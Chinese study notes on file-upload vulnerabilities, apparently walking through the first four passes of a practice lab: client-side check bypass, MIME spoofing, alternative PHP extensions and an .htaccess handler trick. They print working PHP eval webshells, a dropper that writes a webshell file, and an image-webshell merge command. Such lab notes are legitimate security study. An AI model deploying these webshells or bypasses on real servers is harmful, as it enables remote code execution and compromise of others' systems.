# 文件上传学习笔记

## 一句话

一句话

```text
<?php eval($_POST["config"]);?>
```

生成文件马

```text
<?php fputs(fopen('checknet.php','w'),'<?php @eval($_POST[hack]);?>'); ?>
```

合成图片马

```text
copy 图片文件/b + php文件/a 图片文件名
```

`/b`中“b”表示“**二进制文件**”，`/a`中“a"表示**ASCII码文件**。

## pass-1

![image-20201228110213779](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228110213779.png)

点击上传一句话，提示只允许上传三种格式的图片文件，推断为本地客户端验证

方案一：将javascript禁用

![image-20201228110709852](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228110709852.png)

禁用

![image-20201228110728957](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228110728957.png)

然后就可以直接上传

方案二：将文件后缀改为符合要求的后缀名，最后再使用burp抓包修改回php

![image-20201228110557833](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228110557833.png)

上传成功

![image-20201228110626092](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228110626092.png)

## pass-2

尝试上传

![image-20201228111118266](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228111118266.png)

显示文件类型不正确

使用burp抓包修改文件类型

![image-20201228112415282](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228112415282.png)

上传成功

![image-20201228112453790](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228112453790.png)

## pass-3

![image-20201228112543594](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228112543594.png)

提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！

修改文件后缀为Php，尝试大小写绕过

![image-20201228112700275](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228112700275.png)

上传失败

能被解析的文件扩展名列表：

```text
jsp jspx jspf
asp asa cer aspx
php php2 php3 php4 phtml
exe exee
```

最终使用.php3成功上传

![image-20201228113235471](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228113235471.png)

## pass-4

![image-20201228113825877](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201228113825877.png)

提示此文件不许上传，推测为黑名单

尝试绕过失败

**利用Apache漏洞getshell（.htaccess 文件攻击上传shell）**

.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

1.创建htaccess文件，编辑内容为：

SetHandler application/x-httpd-php

他的意思是将该目录下的所有文件解析为php文件来执行

2.如果指定文件名的文件，才能被当做PHP解析，内容为

```text
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

它将该目录下匹配的jpg文件解析为php执行

一般黑名单验证的上传成功几率比较大，白名单什么的并无卵用，先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。

